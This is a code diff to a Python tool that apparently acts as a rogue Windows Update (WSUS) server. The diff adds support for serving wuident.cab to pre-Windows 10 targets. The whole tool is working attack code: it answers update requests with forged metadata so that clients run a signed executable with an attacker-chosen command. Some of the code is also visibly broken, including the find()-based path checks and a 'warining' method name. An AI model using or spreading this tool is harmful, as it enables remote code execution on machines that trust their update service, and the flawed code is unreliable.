@@ -15,7 +15,7 @@ import argparse
 
 
 class Update:
-    def __init__(self, executable_file, executable_name, client_address):
+    def __init__(self, executable_file, executable_name, wuident_executable, client_address):
         self.get_config_xml = ''
         self.get_cookie_xml = ''
         self.sync_updates_xml = ''
@@ -32,6 +32,8 @@ class Update:
         self.sha1 = ''
         self.sha256 = ''
 
+        self.wuident_executable = wuident_executable
+
         self.client_address = client_address
 
     def get_last_change(self):
@@ -43,38 +45,35 @@ class Update:
     def get_expire(self):
         return (datetime.datetime.now() + datetime.timedelta(days=1)).isoformat()
 
-    def set_resources_xml(self, command):
+    def set_resources_xml(self, base_path, command):
         # init resources
-
-        path = os.path.abspath(os.path.dirname(__file__))
-
         try:
-            with open('{}/resources/get-config.xml'.format(path), 'r') as file:
+            with open('{}/resources/get-config.xml'.format(base_path), 'r') as file:
                 self.get_config_xml = file.read().format(lastChange=self.get_last_change())
                 file.close()
 
-            with open('{}/resources/get-cookie.xml'.format(path), 'r') as file:
+            with open('{}/resources/get-cookie.xml'.format(base_path), 'r') as file:
                 self.get_cookie_xml = file.read().format(expire=self.get_expire(), cookie=self.get_cookie())
                 file.close()
 
-            with open('{}/resources/sync-updates.xml'.format(path), 'r') as file:
+            with open('{}/resources/sync-updates.xml'.format(base_path), 'r') as file:
                 # TODO KB1234567 -> dynamic
                 self.sync_updates_xml = file.read().format(revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1],
                                                            deployment_id1=self.deployment_ids[0], deployment_id2=self.deployment_ids[1],
                                                            uuid1=self.uuids[0], uuid2=self.uuids[1], expire=self.get_expire(), cookie=self.get_cookie())
                 file.close()
 
-            with open('{}/resources/get-extended-update-info.xml'.format(path), 'r') as file:
+            with open('{}/resources/get-extended-update-info.xml'.format(base_path), 'r') as file:
                 self.get_extended_update_info_xml = file.read().format(revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1], sha1=self.sha1, sha256=self.sha256,
                                                                        filename=self.executable_name, file_size=len(executable_file), command=html.escape(html.escape(command)),
                                                                        url='http://{host}/{path}/{executable}'.format(host=self.client_address, path=uuid.uuid4(), executable=self.executable_name))
                 file.close()
 
-            with open('{}/resources/report-event-batch.xml'.format(path), 'r') as file:
+            with open('{}/resources/report-event-batch.xml'.format(base_path), 'r') as file:
                 self.report_event_batch_xml = file.read()
                 file.close()
 
-            with open('{}/resources/get-authorization-cookie.xml'.format(path), 'r') as file:
+            with open('{}/resources/get-authorization-cookie.xml'.format(base_path), 'r') as file:
                 self.get_authorization_cookie_xml = file.read().format(cookie=self.get_cookie())
                 file.close()
 
@@ -121,7 +120,14 @@ class S(BaseHTTPRequestHandler):
     def do_GET(self):
         logging.debug('GET request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))
 
-        if self.path.find(".exe"):
+        if self.path.find("selfupdate/wuident.cab"):
+            logging.info("Target is not Windows 10. wuident.cab file requested.")
+            if update_handler.wuident_executable:
+                self._set_response(True)
+                self.wfile.write(update_handler.wuident_executable)
+            else:
+                logging.info("wuident.cab file was not found. Please provide it using the -w argument.")
+        elif self.path.find(".exe"):
             logging.info("Requested: {path}".format(path=self.path))
 
             self._set_response(True)
@@ -199,7 +205,7 @@ class S(BaseHTTPRequestHandler):
             self.wfile.write(data.encode_contents())
 
         else:
-            loggin.warining("SOAP Action not defined")
+            logging.warining("SOAP Action not defined")
 
         if data:
             logging.debug("POST Response,\nPath: {path}\nHeaders:\n{headers}\n\nBody:\n{body}\n".format(path=self.path, headers=self.headers, body=data.encode_contents))
@@ -231,6 +237,7 @@ def parse_args():
     parser.add_argument('-p', '--port', type=int, default=8530, help='The listening port.')
     parser.add_argument('-e', '--executable', type=argparse.FileType('rb'), required=True, help='The Microsoft signed executable returned to the client.')
     parser.add_argument('-c', '--command', required=True, help='The parameters for the current executable.')
+    parser.add_argument('-w', '--wuident-file', type=argparse.FileType('rb'), required=False, help='The path to the wuident.cab file (required for targets older than Windows 10).')
     parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Increase output verbosity.')
 
     return parser.parse_args()
@@ -248,10 +255,16 @@ if __name__ == '__main__':
     executable_name = os.path.basename(args.executable.name)
     args.executable.close()
 
-    update_handler = Update(executable_file, executable_name, client_address='{host}:{port}'.format(host=args.host, port=args.port))
+    base_path = os.path.abspath(os.path.dirname(__file__))
+
+    wuident_executable = None
+    if args.wuident_file:
+        wuident_executable = args.wuident_file.read()
+
+    update_handler = Update(executable_file, executable_name, wuident_executable, client_address='{host}:{port}'.format(host=args.host, port=args.port))
 
     update_handler.set_filedigest()
-    update_handler.set_resources_xml(args.command)
+    update_handler.set_resources_xml(base_path, args.command)
 
     logging.info(update_handler)
 
